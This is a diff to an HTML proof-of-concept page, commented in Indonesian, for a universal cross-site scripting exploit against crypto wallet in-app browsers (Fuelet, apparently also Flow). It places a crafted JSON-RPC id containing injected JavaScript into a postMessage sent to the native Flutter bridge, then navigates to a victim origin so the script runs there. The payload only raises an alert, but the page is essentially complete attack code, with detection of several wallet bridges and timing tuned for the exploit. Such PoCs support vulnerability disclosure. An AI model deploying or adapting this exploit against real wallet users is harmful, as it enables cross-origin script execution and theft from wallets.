@@ -1,48 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC UXSS Fuelet</title>
+    <title>Flow Wallet PoC</title>
+    <style>
+        body { background: #000; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        button { background: #00ef8b; padding: 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <h1>Menghubungkan ke dApp...</h1>
-    <p>Jika tidak berpindah otomatis, <button onclick="runExploit()">Klik di sini</button></p>
+    <h1>Flow DApp Test</h1>
+    <p>Klik tombol di bawah untuk memicu eksploitasi:</p>
+    <button onclick="runExploit()">CLICK TO BYPASS</button>
 
     <script>
         function runExploit() {
-            // Payload ini dirancang untuk:
-            // 1. Menutup argumen pertama fungsi: ")
-            // 2. Menjalankan alert: ;alert(origin);
-            // 3. Menetralkan sisa kode setelahnya dengan comment: //
-            const payloadId = '");alert("Kena XSS di: " + location.origin);//';
+            // Target situs korban
+            const victimSite = "https://www.google.com";
+
+            /* PAYLOAD ANALISIS:
+               1. "); -> Menutup fungsi receiveResponseFromFlutter("");
+               2. alert(origin); -> Menjalankan perintah jahat.
+               3. // -> Memberikan komentar pada sisa kode agar tidak terjadi Syntax Error.
+            */
+            const maliciousId = '");alert("UXSS Berhasil! Origin: " + origin);//';
 
             const requestData = {
                 type: 'request',
-                target: 'FuelContentScript',
+                target: 'FuelContentScript', // Sesuaikan target jika aplikasi menggunakan penamaan berbeda
                 connectorName: 'Fuelet Wallet',
                 request: {
                     jsonrpc: '2.0',
-                    id: payloadId,
+                    id: maliciousId,
                     method: 'connect',
                     params: {}
                 }
             };
 
-            // LANGKAH 1: Kirim pesan ke Native (Flutter)
-            if (window.FueletWallet) {
-                window.FueletWallet.postMessage(JSON.stringify(requestData));
-                
-                // LANGKAH 2: Segera pindah ke domain target (korban)
-                // Kita beri jeda 100ms agar postMessage selesai diproses oleh sistem
+            // Deteksi objek wallet (postMessage bridge)
+            const wallet = window.FueletWallet || window.FlowWallet || window.fcl;
+
+            if (wallet) {
+                // 1. Kirim pesan ke Native
+                wallet.postMessage(JSON.stringify(requestData));
+
+                // 2. Navigasi ke origin korban dengan jeda sedikit lebih lama (150ms-200ms)
+                // Jeda ini krusial agar postMessage terkirim sebelum halaman berpindah
                 setTimeout(() => {
-                    window.location.href = 'https://google.com';
-                }, 100);
+                    window.location.href = victimSite;
+                }, 200); 
             } else {
-                alert("Objek FueletWallet tidak ditemukan. Buka di browser dompet!");
+                alert("Objek Wallet tidak ditemukan. Pastikan buka di browser dompet!");
             }
         }
-
-        // Jalankan otomatis saat halaman dimuat
-        window.onload = runExploit;
     </script>
 </body>
 </html>
